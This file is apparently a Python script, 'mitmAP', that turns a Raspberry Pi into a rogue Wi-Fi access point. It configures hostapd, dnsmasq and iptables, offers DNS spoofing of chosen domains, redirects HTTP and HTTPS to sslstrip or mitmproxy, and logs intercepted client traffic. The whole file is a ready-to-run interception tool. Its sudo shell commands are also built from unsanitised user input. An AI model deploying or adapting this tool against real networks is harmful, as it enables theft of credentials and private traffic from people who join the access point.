import os
import time

print("           _ _              ___  ______ \n" +
      "          (_) |            / _ \ | ___ \\\n" +
      " _ __ ___  _| |_ _ __ ___ / /_\ \| |_/ /\n" +
      "| '_ ` _ \| | __| '_ ` _ \|  _  ||  __/ \n" +
      "| | | | | | | |_| | | | | | | | || |    \n" +
      "|_| |_| |_|_|\__|_| |_| |_\_| |_/\_| 1.0\n" +
      "      RaspberryPI version   by @xdavidhu\n")

update = input("[?] Install/Update dependencies? Y/n: ")
update = update.lower()
if update == "y" or update == "":
    print("[I] Checking/Installing dependencies, please wait...")
    os.system("sudo apt-get update > /dev/null 2>&1")
    os.system("sudo apt-get install dnsmasq -y > /dev/null 2>&1")
    os.system("sudo apt-get install mitmproxy -y > /dev/null 2>&1")
    os.system("sudo apt-get install hostapd -y > /dev/null 2>&1")
    os.system("sudo apt-get install screen -y > /dev/null 2>&1")
    os.system("sudo apt-get install wondershaper -y > /dev/null 2>&1")
    os.system("sudo apt-get install sslstrip -y > /dev/null 2>&1")
ap_iface = input("[?] Please enter the name of your wireless interface (for the AP): ")
net_iface = input("[?] Please enter the name of your internet connected interface: ")
network_manager_cfg = "[main]\nplugins=keyfile\n\n[keyfile]\nunmanaged-devices=interface-name:" + ap_iface
print("[I] Killing wpa_supplicant on " + ap_iface + "...")
os.system("sudo kill -s SIGQUIT $(cat /var/run/wpa_supplicant." + ap_iface + ".pid)")
# print("[I] Backing up NetworkManager.cfg...")
# os.system("sudo cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup")
# print("[I] Editing NetworkManager.cfg...")
# os.system("sudo echo -e '"+network_manager_cfg+"' > /etc/NetworkManager/NetworkManager.conf")
# print("[I] Restarting NetworkManager...")
# os.system("sudo service network-manager restart")
os.system("sudo ifconfig " + ap_iface + " up")
dnsmasq_config = input("[?] Create new DNSMASQ config file at '/etc/dnsmasq.conf' Y/n: ")
dnsmasq_config = dnsmasq_config.lower()
if dnsmasq_config == "y" or dnsmasq_config == "":
    dnsmasq_file = "# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface=" + ap_iface + "\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\n# dns addresses to send to the clients\nserver=8.8.8.8\nserver=8.8.4.4"
    print("[I] Deleting old config file...")
    os.system("sudo rm /etc/dnsmasq.conf > /dev/null 2>&1")
    print("[I] Writing config file...")
    os.system("sudo echo -e '" + dnsmasq_file + "' > /etc/dnsmasq.conf")
else:
    print("[I] Skipping..")
hostapd_config = input("[?] Create new HOSTAPD config file at '/etc/hostapd/hostapd.conf' Y/n: ")
hostapd_config = hostapd_config.lower()
if hostapd_config == "y" or hostapd_config == "":
    ssid = input("[?] Please enter the SSID for the AP: ")
    channel = input("[?] Please enter the channel for the AP: ")
    hostapd_wpa = input("[?] Enable WPA2 encryption? y/N: ")
    hostapd_wpa = hostapd_wpa.lower()
    if hostapd_wpa == "y":
        wpa_passphrase = input("[?] Please enter the WPA2 passphrase for the AP: ")
        hostapd_file_wpa = "interface=" + ap_iface + "\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase=" + wpa_passphrase + "\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP"
        print("[I] Deleting old config file...")
        os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
        print("[I] Writing config file...")
        os.system("sudo echo -e '" + hostapd_file_wpa + "' > /etc/hostapd/hostapd.conf")
    else:
        hostapd_file = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0"
        print("[I] Deleting old config file...")
        os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
        print("[I] Writing config file...")
        os.system("sudo echo -e '" + hostapd_file + "' > /etc/hostapd/hostapd.conf")
else:
    print("[I] Skipping..")
print("[I] Configuring AP interface...")
os.system("sudo ifconfig " + ap_iface + " up 10.0.0.1 netmask 255.255.255.0")
print("[I] Applying iptables rules...")
os.system("sudo iptables --flush")
os.system("sudo iptables --table nat --flush")
os.system("sudo iptables --delete-chain")
os.system("sudo iptables --table nat --delete-chain")
os.system("sudo iptables --table nat --append POSTROUTING --out-interface " + net_iface + " -j MASQUERADE")
os.system("sudo iptables --append FORWARD --in-interface " + ap_iface + " -j ACCEPT")
speed_if = input("[?] Set speed limit for the clients? Y/n: ")
speed_if = speed_if.lower()
if speed_if == "y" or speed_if == "":
    while True:
        speed_down = input("[?] Download speed limit (in KB/s): ")
        if speed_down.isdigit():
            break
        else:
            print("[!] Please enter a number.")
    while True:
        speed_up = input("[?] Upload speed limit (in KB/s): ")
        if speed_up.isdigit():
            break
        else:
            print("[!] Please enter a number.")
    print("[I] Setting speed limit on " + ap_iface + "...")
    os.system("sudo wondershaper " + ap_iface + " " + speed_up + " " + speed_down)
else:
    print("[I] Skipping...")
dns_if = input("[?] Spoof DNS? Y/n: ")
dns_if = dns_if.lower()
if dns_if == "y" or dns_if == "":
    while True:
        dns_num = input("[?] How many domains do you want to spoof?: ")
        if dns_num.isdigit():
            break
        else:
            print("[!] Please enter a number.")
    print("[I] Backing up /etc/dnsmasq.conf...")
    os.system("sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup")
    i = 0
    while int(dns_num) != i:
        dns_num_temp = i + 1
        dns_domain = input("[?] " + str(dns_num_temp) + ". Domain to spoof (no need for 'www.'): ")
        dns_ip = input("[?] Fake IP for domain '" + dns_domain + "': ")
        dns_domain = dns_domain.replace("www.", "")
        dns_line = "address=/" + dns_domain + "/" + dns_ip
        os.system("sudo echo -e '" + dns_line + "' >> /etc/dnsmasq.conf")
        i = i + 1
else:
    print("[I] Skipping..")
print("[I] Starting DNSMASQ server...")
os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
os.system("sudo pkill dnsmasq")
os.system("sudo dnsmasq")
sslstrip_if = input("[?] Use SSLSTRIP? Y/n: ")
sslstrip_if = sslstrip_if.lower()
# wireshark_if = input("[?] Start WIRESHARK on " + ap_iface + "? Y/n: ")
# wireshark_if = wireshark_if.lower()
if sslstrip_if == "y" or sslstrip_if == "":
    proxy_if = "n"
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000")
    os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
    print("[I] Starting AP on " + ap_iface + " in screen terminal...\n")
    os.system("sudo screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
    os.system("sudo screen -S mitmap-sslstrip -m -d sslstrip -l 9000 -w mitmap-sslstrip.log")
    #	if wireshark_if == "y" or wireshark_if == "":
    #		print("[I] Starting WIRESHARK...")
    #		os.system("sudo screen -S mitmap-wireshark -m -d wireshark -i "+ap_iface+" -k -w mitmap-wireshark.pcap")
    print("TAIL started on mitmap-sslstrip.log... Wait for output... (press 'CTRL + C' to stop)\n")
    try:
        time.sleep(5)
    except:
        print("")
    os.system("sudo tail -f mitmap-sslstrip.log")

else:
    proxy_if = input("[?] Capture traffic? Y/n: ")
    proxy_if = proxy_if.lower()
    if proxy_if == "y" or proxy_if == "":
        proxy_config = input("[?] Capture HTTPS traffic too? (Need to install certificate on device) y/N: ")
        proxy_config = proxy_config.lower()
        if proxy_config == "n" or proxy_config == "":
            os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
        else:
            print("[I] To install the certificate, go to 'http://mitm.it/' through the proxy, and choose your OS.")
            os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
            os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
        print("[I] Starting AP on " + ap_iface + " in screen terminal...\n")
        #		if wireshark_if == "y" or wireshark_if == "":
        #			print("[I] Starting WIRESHARK...")
        #			os.system("sudo screen -S mitmap-wireshark -m -d wireshark -i "+ap_iface+" -k -w mitmap-wireshark.pcap")
        os.system("sudo screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
        print("Starting MITMPROXY in 5 seconds... (press q and y to exit)")
        try:
            time.sleep(5)
        except:
            print("")
        os.system("sudo mitmproxy -T -w mitmap-proxy.mitmproxy")
    else:
        print("[I] Skipping...")
        #		if wireshark_if == "y" or wireshark_if == "":
        #			print("[I] Starting WIRESHARK...")
        #			os.system("sudo screen -S mitmap-wireshark -m -d wireshark -i "+ap_iface+" -k -w mitmap-wireshark.pcap")
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
        print("[I] Starting AP on " + ap_iface + "...\n")
        os.system("sudo hostapd /etc/hostapd/hostapd.conf")
print("")
print("[!] Stopping...")
if proxy_if == "y" or proxy_if == "" or sslstrip_if == "y" or sslstrip_if == "":
    os.system("sudo screen -S mitmap-hostapd -X stuff '^C\n'")
    if sslstrip_if == "y" or sslstrip_if == "":
        os.system("sudo screen -S mitmap-sslstrip -X stuff '^C\n'")
# if wireshark_if == "y" or wireshark_if == "":
#	os.system("sudo screen -S mitmap-wireshark -X stuff '^C\n'")
# print("[I] Restoreing old NetworkManager.cfg")
# os.system("sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf")
# print("[I] Restarting NetworkManager...")
# os.system("sudo service network-manager restart")
print("[I] Stopping DNSMASQ server...")
os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
os.system("sudo pkill dnsmasq")
print("[I] Restoreing old dnsmasq.cfg...")
os.system("sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1")
print("[I] Deleting old '/etc/dnsmasq.hosts' file...")
os.system("sudo rm /etc/dnsmasq.hosts > /dev/null 2>&1")
print("[I] Removeing speed limit from " + ap_iface + "...")
os.system("sudo wondershaper clear " + ap_iface + " > /dev/null 2>&1")
print("[I] Flushing iptables rules...")
os.system("sudo iptables --flush")
if proxy_if == "y" or proxy_if == "":
    #   if wireshark_if == "y" or wireshark_if == "":
    #		print("[I] Traffic have been saved to the file 'mitmap-proxy.mitmproxy' and to file 'mitmap-wireshark.pcap'. View the '.mitmap' file later by 'mitmproxy -r [file]'.")
    print("[I] Traffic have been saved to the file 'mitmap-proxy.mitmproxy'. View it later by 'mitmproxy -r [file]'.")
if sslstrip_if == "y" or sslstrip_if == "":
    #	if wireshark_if == "y" or wireshark_if == "":
    #		print("[I] Traffic have been saved to the file 'mitmap-sslstrip.log' and to file 'mitmap-wireshark.pcap'.")
    print("[I] Traffic have been saved to the file 'mitmap-sslstrip.log'.")
print("\n[!] WARNING: If you want to use the AP interface normally, please reboot the PI!\n")
print("[I] mitmAP stopped.")
